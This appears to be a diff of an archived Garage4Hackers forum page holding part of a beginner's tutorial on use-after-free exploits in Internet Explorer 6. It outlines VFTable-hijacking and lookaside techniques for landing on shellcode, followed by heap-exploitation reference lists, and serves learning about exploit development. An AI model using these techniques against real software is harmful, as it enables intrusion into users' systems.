-<a href="../projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">source</a>:<br />
-<br />
-<u><b>2) The VFTable exploit</b></u><br />
-<br />
-<u>Requirements:<br />
-<br />
-</u><br />
-A controllable VFTable .<br />
-<u>Method:</u><br />
-Our code is injected in the VFTable which is made to point to itself.<br />
-<br />
-<u>Depends:<br />
-</u><br />
-This this achieved by the system allocation process.<br />
-<br />
-<u><b>The Lookaside exploit<br />
-<br />
-</b>Requirements: </u><br />
-<br />
-A controllable heap allocation / heap deallocation cycle. <br />
-<br />
-<u>Method:<br />
-</u><br />
-<br />
-Since the system reallocates a freed memory , we craft the code in such a way that when reallocation takes place our injected code is used in the reallocation cycle. <br />
-<br />
-Read More: <a href="../www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br />
-Read in detail here a similar approach <a href="../www.ise.io/files/papers/isewoot08.html" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br />
-<br />
-<br />
-For choosing an appropriate method for exploitation we need determine what all we control in the current scenario and understand more about the crash. We can either use the debugger for this purpose or reverse engineer the current code to figure out those details.<br />
-<br />
-*Thanks to w3devil and Zarul for proof reading the doc<br />
-<br />
-<br />
-Cheers. <br />
-<br />
-<br />
-<b>References on Heap : <br />
-</b><br />
- <a href="../external.html?link=http://www.tenouk.com/ModuleZ.html" target="_blank">A practical C storage class scope and memory allocation programming online training - C language references, working program examples, source code and memory related function library</a><br />
-<a href="../external.html?link=http://en.wikipedia.org/wiki/Data_segment" target="_blank">Data segment - Wikipedia, the free encyclopedia</a><br />
-<a href="../external.html?link=http://en.wikipedia.org/wiki/Code_segment" target="_blank">Memory segmentation - Wikipedia, the free encyclopedia</a><br />
-<a href="../external.html?link=http://en.wikipedia.org/wiki/.bss" target="_blank">.bss - Wikipedia, the free encyclopedia</a><br />
-<a href="../external.html?link=http://www.geeksforgeeks.org/archives/14268" target="_blank">Memory Layout of C Programs - GeeksforGeeks | GeeksforGeeks</a><br />
-<a href="../external.html?link=http://code.google.com/p/gperftools/?redir=1" target="_blank">gperftools - Fast, multi-threaded malloc() and nifty performance analysis tools - Google Project Hosting</a><br />
-<a href="../external.html?link=http://www.h-online.com/security/features/A-Heap-of-Risk-747220.html" target="_blank">A Heap of Risk - The H Security: News and Features</a><br />
-<a href="../external.html?link=http://x9090.blogspot.in/2010/03/tutorial-exploit-writting-tutorial-from.html" target="_blank">http://x9090.blogspot.in/2010/03/tut...rial-from.html</a><br />
-<a href="../external.html?link=http://en.wikibooks.org/wiki/C_Programming/C_Reference/stdlib.h/malloc#Use_after_free" target="_blank">http://en.wikibooks.org/wiki/C_Progr...Use_after_free</a><br />
-<a href="../external.html?link=http://www.quora.com/Why-is-dynamic-memory-allocation-called-heap-memory-allocation" target="_blank">http://www.quora.com/Why-is-dynamic-...ory-allocation</a><br />
-<a href="../external.html?link=http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/" target="_blank">http://eli.thegreenplace.net/2011/09...out-on-x86-64/</a><br />
-<br />
-Exploitation References :<br />
-<a href="../external.html?link=http://d0cs4vage.blogspot.in/2011/06/insecticides-dont-kill-bugs-patch.html" target="_blank">http://d0cs4vage.blogspot.in/2011/06...ugs-patch.html</a><br />
-<a href="../external.html?link=http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br />
-<a href="../www.ise.io/files/papers/isewoot08.html" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br />
-<a href="../external.html?link=http://www.exploit-monday.com/2011_11_13_archive.html" target="_blank">http://www.exploit-monday.com/2011_11_13_archive.html</a><br />
-<a href="../www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf" target="_blank">www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf</a><br />
-<a href="../external.html?link=http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br />
-<a href="../external.html?link=http://www.thegreycorner.com/2010/01/heap-spray-exploit-tutorial-internet.html" target="_blank">http://www.thegreycorner.com/2010/01...-internet.html</a><br />
-<a href="../www.owasp.org/images/0/01/OWASL_IL_2010_Jan_-_Moshe_Ben_Abu_-_Advanced_Heapspray.pdf" target="_blank">https://www.owasp.org/images/0/01/OW..._Heapspray.pdf</a><br />
-<a href="../external.html?link=https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/#Visualizing_the_heap_spray_8211_IE6" target="_blank">https://www.corelan.be/index.php/201...spray_8211_IE6</a><br />
-<a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a><br />
-<a href="../www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br />
-<a href="../external.html?link=http://www.exploit-monday.com/2011/07/post-mortem-analysis-of-use-after-free_07.html" target="_blank">http://www.exploit-monday.com/2011/0...r-free_07.html</a><br />
-<a href="../external.html?link=http://www.vupen.com/blog/20120116.Advanced_Exploitation_of_ProFTPD_Remote_Use_after_free_CVE-2011-4130_Part_II.php" target="_blank">http://www.vupen.com/blog/20120116.A...30_Part_II.php</a><br />
-<br />
-<br />
-Protection Mechanisms:<br />
+	<pre class="bbcode_code" style="height:36px;"><font color="#800000">7d51f44d ff5034 call dword ptr [eax+34h]</font></pre>
+</div>Vftable+34h would make the program land on our shellcode.  <br/>
+<br/>
+There are <a href="../projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">couple</a> of ways to exploit this a good reference would be <a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">this</a>.<br/>
+<br/>
+<u><b>1) The double reference exploit</b></u><br/>
+<br/>
+<br/>
+<u>Requirements:</u> <br/>
+<br/>
+A controllable VFTable pointer.<br/>
+<br/>
+<u>Method:</u><br/>
+<br/>
+Our own code is placed in the deallocated object or some where in the memory where we could point to via Vftable.<br/>
+<br/>
+Then we replace the VFTable pointer by one which points to some memory<br/>
+later we will use this as VFTable pointing back to where we put our code.<br/>
+<br/>
+<a href="../projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">source</a>:<br/>
+<br/>
+<u><b>2) The VFTable exploit</b></u><br/>
+<br/>
+<u>Requirements:<br/>
+<br/>
+</u><br/>
+A controllable VFTable .<br/>
+<u>Method:</u><br/>
+Our code is injected in the VFTable which is made to point to itself.<br/>
+<br/>
+<u>Depends:<br/>
+</u><br/>
+This this achieved by the system allocation process.<br/>
+<br/>
+<u><b>The Lookaside exploit<br/>
+<br/>
+</b>Requirements: </u><br/>
+<br/>
+A controllable heap allocation / heap deallocation cycle. <br/>
+<br/>
+<u>Method:<br/>
+</u><br/>
+<br/>
+Since the system reallocates a freed memory , we craft the code in such a way that when reallocation takes place our injected code is used in the reallocation cycle. <br/>
+<br/>
+Read More: <a href="../www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br/>
+Read in detail here a similar approach <a href="../www.ise.io/files/papers/isewoot08.html" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br/>
+<br/>
+<br/>
+For choosing an appropriate method for exploitation we need determine what all we control in the current scenario and understand more about the crash. We can either use the debugger for this purpose or reverse engineer the current code to figure out those details.<br/>
+<br/>
+*Thanks to w3devil and Zarul for proof reading the doc<br/>
+<br/>
+<br/>
+Cheers. <br/>
+<br/>
+<br/>
+<b>References on Heap : <br/>
+</b><br/>
+ <a href="../external.html?link=http://www.tenouk.com/ModuleZ.html" target="_blank">A practical C storage class scope and memory allocation programming online training - C language references, working program examples, source code and memory related function library</a><br/>
+<a href="../external.html?link=http://en.wikipedia.org/wiki/Data_segment" target="_blank">Data segment - Wikipedia, the free encyclopedia</a><br/>
+<a href="../external.html?link=http://en.wikipedia.org/wiki/Code_segment" target="_blank">Memory segmentation - Wikipedia, the free encyclopedia</a><br/>
+<a href="../external.html?link=http://en.wikipedia.org/wiki/.bss" target="_blank">.bss - Wikipedia, the free encyclopedia</a><br/>
+<a href="../external.html?link=http://www.geeksforgeeks.org/archives/14268" target="_blank">Memory Layout of C Programs - GeeksforGeeks | GeeksforGeeks</a><br/>
+<a href="../external.html?link=http://code.google.com/p/gperftools/?redir=1" target="_blank">gperftools - Fast, multi-threaded malloc() and nifty performance analysis tools - Google Project Hosting</a><br/>
+<a href="../external.html?link=http://www.h-online.com/security/features/A-Heap-of-Risk-747220.html" target="_blank">A Heap of Risk - The H Security: News and Features</a><br/>
+<a href="../external.html?link=http://x9090.blogspot.in/2010/03/tutorial-exploit-writting-tutorial-from.html" target="_blank">http://x9090.blogspot.in/2010/03/tut...rial-from.html</a><br/>
+<a href="../external.html?link=http://en.wikibooks.org/wiki/C_Programming/C_Reference/stdlib.h/malloc#Use_after_free" target="_blank">http://en.wikibooks.org/wiki/C_Progr...Use_after_free</a><br/>
+<a href="../external.html?link=http://www.quora.com/Why-is-dynamic-memory-allocation-called-heap-memory-allocation" target="_blank">http://www.quora.com/Why-is-dynamic-...ory-allocation</a><br/>
+<a href="../external.html?link=http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/" target="_blank">http://eli.thegreenplace.net/2011/09...out-on-x86-64/</a><br/>
+<br/>
+Exploitation References :<br/>
+<a href="../external.html?link=http://d0cs4vage.blogspot.in/2011/06/insecticides-dont-kill-bugs-patch.html" target="_blank">http://d0cs4vage.blogspot.in/2011/06...ugs-patch.html</a><br/>
+<a href="../external.html?link=http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br/>
+<a href="../www.ise.io/files/papers/isewoot08.html" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br/>
+<a href="../external.html?link=http://www.exploit-monday.com/2011_11_13_archive.html" target="_blank">http://www.exploit-monday.com/2011_11_13_archive.html</a><br/>
+<a href="../www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf" target="_blank">www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf</a><br/>
+<a href="../external.html?link=http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br/>
+<a href="../external.html?link=http://www.thegreycorner.com/2010/01/heap-spray-exploit-tutorial-internet.html" target="_blank">http://www.thegreycorner.com/2010/01...-internet.html</a><br/>
+<a href="../www.owasp.org/images/0/01/OWASL_IL_2010_Jan_-_Moshe_Ben_Abu_-_Advanced_Heapspray.pdf" target="_blank">https://www.owasp.org/images/0/01/OW..._Heapspray.pdf</a><br/>
+<a href="../external.html?link=https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/#Visualizing_the_heap_spray_8211_IE6" target="_blank">https://www.corelan.be/index.php/201...spray_8211_IE6</a><br/>
+<a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a><br/>
+<a href="../www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br/>
+<a href="../external.html?link=http://www.exploit-monday.com/2011/07/post-mortem-analysis-of-use-after-free_07.html" target="_blank">http://www.exploit-monday.com/2011/0...r-free_07.html</a><br/>
+<a href="../external.html?link=http://www.vupen.com/blog/20120116.Advanced_Exploitation_of_ProFTPD_Remote_Use_after_free_CVE-2011-4130_Part_II.php" target="_blank">http://www.vupen.com/blog/20120116.A...30_Part_II.php</a><br/>
+<br/>
+<br/>
+Protection Mechanisms:<br/>
 <a href="../external.html?link=http://robert.ocallahan.org/2010/10/mitigating-dangling-pointer-bugs-using_15.html" target="_blank">http://robert.ocallahan.org/2010/10/...-using_15.html</a></div>
 
 	
 
 	
-		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.js?v=421"></script>
+		<script src="clientscript/vbulletin_lightbox6719.js?v=421" type="text/javascript"></script>
 		<script type="text/javascript">
 		<!--
 		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
@@ -1275,7 +1271,7 @@ Protection Mechanisms:<br />
 	
 		<sub class="article_promoted_text">
 			This article was originally published in blog:
-			<a href="bloge81f.html?u=8">Beginners Guide to &quot;Use after free Exploits #IE 6 0-day #Exploit Development&quot;</a>
+			<a href="bloge81f.html?u=8">Beginners Guide to "Use after free Exploits #IE 6 0-day #Exploit Development"</a>
 			started by
 			<a href="membere81f.html?u=8">fb1h2s</a>
 		</sub>
@@ -1301,7 +1297,7 @@ Protection Mechanisms:<br />
 			<a href="tagsfb79.html?tag=use+after+free+exploits">use after free exploits</a>
 		
 
-<img src="images/misc/11x11progress.gif" id="tag_form_progress" class="inlineimg hidden" alt="" />
+<img alt="" class="inlineimg hidden" id="tag_form_progress" src="images/misc/11x11progress.gif"/>
 			</div>
 		</div>
 	
@@ -1315,22 +1311,22 @@ Protection Mechanisms:<br />
 	vbphrase['comment'] = "Comment";
 	vbphrase['comments'] = "Comments";
 </script>
-<div id="comments" class="cms_comments_page">
+<div class="cms_comments_page" id="comments">
 	<a name="comments_start"></a>
 	<div id="node_comments_block">
-	<input type="hidden" value="1" id="allow_ajax_qr" />
-	<div id="comments_comment_count" class="comments_comment_count">
-		<img src="images/misc/comment.png" alt="Comments" border="0" /><span id="comments_block_count"> 1</span> <span id="comments_block_text">Comment</span>
+	<input id="allow_ajax_qr" type="hidden" value="1"/>
+	<div class="comments_comment_count" id="comments_comment_count">
+		<img alt="Comments" border="0" src="images/misc/comment.png"/><span id="comments_block_count"> 1</span> <span id="comments_block_text">Comment</span>
 	</div>
-	<div id="node_comments" class="cms_none_comments">
-		<div id="comments_13012" class="cms_comments_mainbox postcontainer">
+	<div class="cms_none_comments" id="node_comments">
+		<div class="cms_comments_mainbox postcontainer" id="comments_13012">
 	<ol>
 <li class="postbit postbit-lite" id="post_13012">
 <div class="postbit_pb_left">
 <a name="comment_13012"></a>
 	
 		
-			<a href="member738a.html?u=8136" class="avatarlink"><img src="images/misc/unknown.gif" width="60" height="60" alt="centroid's Avatar" border="0" /></a>
+			<a class="avatarlink" href="member738a.html?u=8136"><img alt="centroid's Avatar" border="0" height="60" src="images/misc/unknown.gif" width="60"/></a>
 		
 	
 	</div>
@@ -1338,7 +1334,7 @@ Protection Mechanisms:<br />
 	<div class="comment_blockrow postbit_headers postbit_borders">
 		<div class="floatleft">
 			
-				<a href="member738a.html?u=8136" class="username">centroid</a>
+				<a class="username" href="member738a.html?u=8136">centroid</a>
 			
 			 - <span class="postdate">02-10-2014, <span class="time">07:52 AM</span></span>
 		</div>
@@ -1350,7 +1346,7 @@ Protection Mechanisms:<br />
 				
 				
 					<li>
-						<a href="newreply41a3.html?do=newreply&amp;p=13012&amp;return_node=143" class="reply" rel="nofollow"><img src="images/buttons/reply_40b.png" alt="" class="inlineimg" /> Reply</a>
+						<a class="reply" href="newreply41a3.html?do=newreply&amp;p=13012&amp;return_node=143" rel="nofollow"><img alt="" class="inlineimg" src="images/buttons/reply_40b.png"/> Reply</a>
 					</li>
 				
 				
@@ -1359,7 +1355,7 @@ Protection Mechanisms:<br />
 		</ul>
 	</div>
 	</div>
-	<div id="post_message_13012" class="comment_text">
+	<div class="comment_text" id="post_message_13012">
 		<blockquote class="posttext restore restore_margin">
 			Very good article. Thanks for so many references.
 		</blockquote>
@@ -1370,7 +1366,7 @@ Protection Mechanisms:<br />
 	<div id="respond_13012"></div>
 </div>
 	</div>
-	<div id="pagenav" class="comments_page_nav_css fullwidth">
+	<div class="comments_page_nav_css fullwidth" id="pagenav">
 		
 	</div>
         <script type="text/javascript">
@@ -1379,24 +1375,24 @@ Protection Mechanisms:<br />
 		vB_XHTML_Ready.subscribe(function (e) {vB_AJAX_QuickEdit_Init('node_comments');})
 	//-->
         </script>
-	<div id="ajax_post_errors" class="hidden">
+	<div class="hidden" id="ajax_post_errors">
 		<div class="block">
 			<div class="blockhead floatcontainer">
-				<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" tabindex="50" /></span>
+				<span class="blockhead_info"><input class="button" id="quick_edit_errors_hide" tabindex="50" type="button" value=" X "/></span>
 				<h2>vBulletin Message</h2>
 			</div>
 			<div class="blockbody">
-				<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
+				<div class="blockrow" id="ajax_post_errors_message"> </div>
 			</div>
 			<div class="blockfoot">
-				<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
+				<a class="textcontrol" href="#" id="quick_edit_errors_cancel">Cancel Changes</a>
 			</div>
 		</div>
 	</div>
 </div>
-	<script type="text/javascript" src="clientscript/vbulletin-editor6719.js?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_quick_edit6719.js?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.js?v=421"></script>
+	<script src="clientscript/vbulletin-editor6719.js?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_quick_edit6719.js?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_post_loader6719.js?v=421" type="text/javascript"></script>
 	<div id="node_comments_hide"></div>
 	<!-- EDITOR IS BREAKING THE PAGE -->
 	
@@ -1414,19 +1410,19 @@ Protection Mechanisms:<br />
 <li><div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-		<h3><img src="images/site_icons/html.png" alt="" /> G4H Facebook</h3>
+		<h3><img alt="" src="images/site_icons/html.png"/> G4H Facebook</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
-		<div class="fb-like-box" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-width="300" data-height="250" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
+		<div class="fb-like-box" data-colorscheme="light" data-header="true" data-height="250" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-show-border="true" data-show-faces="true" data-stream="false" data-width="300"></div>
 		</div>
 	</div>
 </div></li><li><div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-		<h3><img src="images/site_icons/html.png" alt="" /> G4H Twitter</h3>
+		<h3><img alt="" src="images/site_icons/html.png"/> G4H Twitter</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
-		<a class="twitter-timeline"  href="../external.html?link=https://twitter.com/garage4hackers"  data-widget-id="387207513831010305">Tweets by @garage4hackers</a>
+		<a class="twitter-timeline" data-widget-id="387207513831010305" href="../external.html?link=https://twitter.com/garage4hackers">Tweets by @garage4hackers</a>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 		</div>
 	</div>
@@ -1457,8 +1453,7 @@ google_color_url = "";
 google_ui_features = "rc:6";
 //-->
 </script>
-<script type="text/javascript"
-  src="../pagead2.googlesyndication.com/pagead/f.txt">
+<script src="../pagead2.googlesyndication.com/pagead/f.txt" type="text/javascript">
 </script>
 </div>
 
@@ -1471,24 +1466,23 @@ google_ad_width = 728;
 google_ad_height = 90;
 //-->
 </script>
-<script type="text/javascript"
-src="../pagead2.googlesyndication.com/pagead/f.txt">
+<script src="../pagead2.googlesyndication.com/pagead/f.txt" type="text/javascript">
 </script></div>
 </div>
 
-<div id="footer" class="floatcontainer footer">
+<div class="floatcontainer footer" id="footer">
 
-	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">
 
 		
 			<select name="styleid" onchange="switch_id(this, 'style')">
 				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
 				
 					
-					<optgroup label="&nbsp;Standard Styles">
+					<optgroup label=" Standard Styles">
 									
 					
-	<option value="1" class="" selected="selected">-- Default Style</option>
+	<option class="" selected="selected" value="1">-- Default Style</option>
 
 					
 					</optgroup>
@@ -1496,10 +1490,10 @@ src="../pagead2.googlesyndication.com/pagead/f.txt">
 				
 				
 					
-					<optgroup label="&nbsp;Mobile Styles">
+					<optgroup label=" Mobile Styles">
 					
 					
-	<option value="2" class="" >-- Default Mobile Style</option>
+	<option class="" value="2">-- Default Mobile Style</option>
 
 					
 					</optgroup>
@@ -1511,8 +1505,8 @@ src="../pagead2.googlesyndication.com/pagead/f.txt">
 		
 	</form>
 
-	<ul id="footer_links" class="footer_links">
-		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+	<ul class="footer_links" id="footer_links">
+		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
 		<li><a href="index.html">Garage4hackers</a></li>
 		
 		
@@ -1538,16 +1532,16 @@ src="../pagead2.googlesyndication.com/pagead/f.txt">
 </div> <!-- closing div for body_wrapper -->
 
 <div class="below_body">
-<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:19 PM</span>.</div>
+<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">04:19 PM</span>.</div>
 
-<div id="footer_copyright" class="shade footer_copyright">
+<div class="shade footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="shade footer_morecopyright">
+<div class="shade footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
-	<img src="cron2481.gif?rand=1584614941" alt="" width="1" height="1" border="0" />
+	<img alt="" border="0" height="1" src="cron2481.gif?rand=1584614941" width="1"/>
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	Copyright 2010 - 2017, Garage4Hackers
 	
@@ -1555,7 +1549,7 @@ src="../pagead2.googlesyndication.com/pagead/f.txt">
  
 
 	<div id="fb-root"></div>
-<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>
 
 <script type="text/javascript">
 <!--
@@ -1588,5 +1582,5 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
-</html>
+
+</div></body></html>
